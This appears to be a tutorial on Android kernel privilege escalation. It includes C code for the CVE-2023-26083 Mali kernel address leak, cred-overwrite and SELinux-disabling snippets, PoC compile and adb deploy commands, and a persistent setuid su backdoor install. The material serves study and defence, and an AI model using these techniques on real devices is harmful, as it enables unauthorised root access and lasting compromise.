# Kernel Privilege Escalation Techniques

How Android kernel privilege escalation works: from memory corruption to root shell. Covers `task_struct`, `cred` structure manipulation, KASLR bypass, and a real CVE walkthrough.

## Escalation Flow (High-Level)

```
1. Exploit memory corruption → get arbitrary kernel R/W
2. Leak kernel address → bypass KASLR
3. Locate task_struct → find your process
4. Locate cred inside task_struct → find your credentials
5. Overwrite cred fields → become root
6. Bypass SELinux → full device control
```

## Key Kernel Data Structures

### task_struct

Every process/thread in Android is represented by `struct task_struct` (in `include/linux/sched.h`).

**Security-critical fields:**

| Field | Purpose |
|---|---|
| `pid` | Process ID |
| `tgid` | Thread group ID (PID of main thread) |
| `comm` | Process name (16 chars) |
| `cred` | **Active credentials** (what kernel checks for permissions) |
| `real_cred` | Original credentials before privilege changes |
| `mm` | Memory descriptor (process memory layout) |
| `files` | Open file descriptors |
| `fs` | Filesystem context (cwd, root) |

**Exploits target `cred`, not `real_cred`** — `cred` is what the kernel actually checks.

### struct cred

Defines the security identity of a process.

**User/Group IDs:**

| Field | Meaning |
|---|---|
| `uid` | Real user ID |
| `gid` | Real group ID |
| `euid` | Effective user ID |
| `egid` | Effective group ID |
| `suid` | Saved user ID |
| `sgid` | Saved group ID |
| `fsuid` | Filesystem user ID |
| `fsgid` | Filesystem group ID |

**Capabilities:**

| Field | Purpose |
|---|---|
| `cap_inheritable` | Caps inherited by child processes |
| `cap_permitted` | Maximum caps process is allowed |
| `cap_effective` | Caps currently active (kernel checks this) |
| `cap_bset` | Hard upper limit — can never exceed |
| `cap_ambient` | Auto-inherited essential caps |

### Values to Write for Root

Reference: `init_cred` in `kernel/cred.c` (init process credentials).

```
All UIDs/GIDs = 0:
  uid=0, gid=0, suid=0, sgid=0
  euid=0, egid=0, fsuid=0, fsgid=0

securebits = 0

Capabilities:
  cap_inheritable  = 0
  cap_permitted    = 0x3fffffffff  (all caps)
  cap_effective    = 0x3fffffffff  (all caps)
  cap_bset         = 0x3fffffffff  (all caps)
  cap_ambient      = 0
```

## Finding Structure Offsets with pahole

`pahole` reads DWARF debug info from unstripped `vmlinux` to show structure layouts.

```bash
# Inspect task_struct layout
pahole -C task_struct vmlinux

# Inspect cred layout
pahole -C cred vmlinux

# Output shows: field name, type, offset, size
# Example:
#   pid    int    offset:1234  size:4
#   cred   struct cred *  offset:2048  size:8
```

**Requirement:** Unstripped `vmlinux` with DWARF symbols. Best obtained by compiling the kernel yourself (OTA kernels are usually stripped).

## Step-by-Step Exploitation

### Step 1: Get Arbitrary Kernel R/W

Via a memory corruption vulnerability:
- Buffer overflow → overwrite adjacent data
- Use-after-free → reclaim freed object with controlled data
- Integer overflow → corrupt size/length fields

### Step 2: Leak Kernel Address (Bypass KASLR)

**CVE-2023-26083 method (Mali GPU timeline stream):**

```c
// 1. Open Mali device (no permissions needed)
int fd = open("/dev/mali0", O_RDWR);

// 2. Handshake
struct kbase_ioctl_version_check cmd = {.major = 1, .minor = -1};
ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &cmd);

struct kbase_ioctl_set_flags flags = {0};
ioctl(fd, KBASE_IOCTL_SET_FLAGS, &flags);

// 3. Acquire timeline stream (returns FD for ring buffer)
int streamfd = ioctl(fd, KBASE_IOCTL_TLSTREAM_ACQUIRE,
    &(struct kbase_ioctl_tlstream_acquire){
        .flags = BASE_TLSTREAM_ENABLE_CSF_TRACEPOINTS
    });

// 4. Get context ID
struct kbase_ioctl_get_context_id ctx_info = {};
ioctl(fd, KBASE_IOCTL_GET_CONTEXT_ID, &ctx_info);
uint32_t kctx_id = ctx_info.id;

// 5. Create KCPU queue (triggers timeline event with kernel pointer)
struct kbase_ioctl_kcpu_queue_new queue_info = {};
ioctl(fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &queue_info);
uint32_t kcpu_id = queue_info.id;

// 6. Read timeline stream, parse for KBASE_TL_KBASE_NEW_KCPUQUEUE (msg_id=59)
char buf[0x1000];
ssize_t rb = read(streamfd, buf, sizeof(buf));
// Parse buffer for msg_id==59, matching kcpu_id and kctx_id
// Extract 8-byte kernel pointer at offset 12 in the message
uint64_t leaked_kernel_addr = *(uint64_t*)(p + 12);

// 7. Calculate kernel base
// kernel_base = leaked_addr - known_offset_of_kcpu_queue
```

**Result:** `0xffffff80462ec000` — kernel virtual address leaked from `uid=2000(shell)`.

**Other leak methods:**
- `/proc/kallsyms` (if readable — root or permissive config)
- Kernel oops backtrace written to log files (Samsung `sec_log.log`)
- Side-channel timing attacks
- GPU driver info leaks (various CVEs)

### Step 3: Locate task_struct

With leaked kernel address + pahole offsets:
```c
// From leaked address, calculate base
uint64_t kernel_base = leaked_addr - KNOWN_OFFSET;

// Find current task via:
// - thread_info at bottom of kernel stack
// - current_task per-CPU variable
// - Walk task list from init_task
```

### Step 4: Locate cred

```c
// cred pointer is at a fixed offset within task_struct
// Use pahole output for your kernel version
uint64_t cred_ptr_addr = task_struct_addr + CRED_OFFSET;

// Read the cred pointer
uint64_t cred_addr = kernel_read64(cred_ptr_addr);
```

### Step 5: Overwrite cred

```c
// Set all UIDs to 0
kernel_write32(cred_addr + UID_OFFSET, 0);
kernel_write32(cred_addr + GID_OFFSET, 0);
kernel_write32(cred_addr + EUID_OFFSET, 0);
kernel_write32(cred_addr + EGID_OFFSET, 0);
kernel_write32(cred_addr + SUID_OFFSET, 0);
kernel_write32(cred_addr + SGID_OFFSET, 0);
kernel_write32(cred_addr + FSUID_OFFSET, 0);
kernel_write32(cred_addr + FSGID_OFFSET, 0);

// Set securebits to 0
kernel_write32(cred_addr + SECUREBITS_OFFSET, 0);

// Set all capabilities to full
uint64_t all_caps = 0x3fffffffff;
kernel_write64(cred_addr + CAP_PERMITTED_OFFSET, all_caps);
kernel_write64(cred_addr + CAP_EFFECTIVE_OFFSET, all_caps);
kernel_write64(cred_addr + CAP_BSET_OFFSET, all_caps);
```

### Step 6: Root Shell

```c
// Process now has uid=0 with all capabilities
system("/system/bin/sh");
// Or: execve("/system/bin/sh", NULL, NULL);
```

### Step 7: Bypass SELinux (if enforcing)

Even with root, SELinux may block actions:
```c
// Find selinux_enforcing variable
uint64_t selinux_addr = kernel_base + SELINUX_ENFORCING_OFFSET;
// Set to 0 (permissive)
kernel_write32(selinux_addr, 0);

// Alternative: modify process SELinux context
// Patch security_struct to transition to permissive domain
```

## Real-World Exploit Chains

### Samsung CVE-2021-25337/25369/25370
1. **Stage 1 (CVE-2021-25337):** Clipboard provider arbitrary file R/W → write malicious .so
2. **Stage 2 (CVE-2021-25369):** Mali HWCNT ioctl → leak kernel backtrace from `sec_log.log` → KASLR bypass
3. **Stage 3 (CVE-2021-25370):** DECON display driver UAF → heap spray → fake file struct → `addr_limit` overwrite → arbitrary kernel R/W → overwrite `cred` → root

### Google Pixel CVE-2024-23380 (KGSL GPU)
1. Race condition in KGSL VBO management → UAF
2. Release freed pages via memory pressure
3. Heap spray `kgsl_mem_entry` objects
4. Scan via GPU `CP_MEM_TO_MEM` to find sprayed objects
5. Corrupt `kgsl_memdesc.ops` pointer → `kgsl_contiguous_vmfault`
6. mmap corrupted entry → maps arbitrary kernel physical memory
7. Overwrite `struct cred` → root

### Google Pixel CVE-2023-20938 (Binder)
1. Binder `binder_transaction()` error handling → unaligned `offsets_size` → incorrect refcount decrement
2. Dangling pointer in `binder_buffer->target_node`
3. 16-byte leak via `binder_thread_read()` + `sendmsg` spray
4. Unlink primitive via `hlist_del(&node->dead_node)`
5. Cross-cache attack: 1152 `binder_node` → SLUB page release → reallocate as `struct epitem`
6. Corrupt `struct file->inode` → arbitrary 4-byte read via `FIGETBSZ` ioctl
7. Locate + overwrite `cred` UIDs → disable SELinux → clear seccomp

## Mali GPU IOCTL Reference

| IOCTL | Number | Purpose |
|---|---|---|
| `KBASE_IOCTL_VERSION_CHECK` | 52 | API handshake |
| `KBASE_IOCTL_SET_FLAGS` | 1 | Initialize flags |
| `KBASE_IOCTL_TLSTREAM_ACQUIRE` | 18 | Get timeline stream FD |
| `KBASE_IOCTL_GET_CONTEXT_ID` | 17 | Get GPU context ID |
| `KBASE_IOCTL_KCPU_QUEUE_CREATE` | 45 | Create KCPU queue |
| `KBASE_IOCTL_MEM_ALLOC` | 5 | GPU memory allocation |
| `KBASE_IOCTL_JOB_SUBMIT` | (varies) | Submit GPU job |

Timeline event IDs:
- `KBASE_TL_KBASE_NEW_KCPUQUEUE` = 59 (contains leaked pointer)

## Compilation Reference

```bash
# Compile PoC for Android ARM64
$NDK/toolchains/llvm/prebuilt/*/bin/aarch64-linux-android34-clang++ \
  -static-libstdc++ -w -Wno-c++11-narrowing -g -O0 \
  poc.cpp -o poc -llog

# Verify
file poc  # ELF 64-bit ARM aarch64

# Deploy and run
adb push poc /data/local/tmp/
adb shell "cd /data/local/tmp && ./poc"
# Output: [+] Got kcpu_id kernel address = 0xffffff80...
```

## Post-Exploitation Persistence

After achieving root:
```bash
# Remount system partition
mount -o rw,remount /system

# Install persistent backdoor
cp su /system/xbin/su
chmod 6755 /system/xbin/su

# Or install Magisk for systemless root
# Or modify init scripts for boot persistence
```

## Key Takeaways

1. `task_struct.cred` is the #1 target for privilege escalation
2. KASLR must be bypassed first — info leaks are critical
3. `pahole` gives exact offsets for your target kernel version
4. Writing UIDs=0 + caps=0x3fffffffff to `cred` = root
5. SELinux bypass is often needed after cred overwrite
6. Real exploits chain 2-3 bugs: info leak + memory corruption + privilege escalation
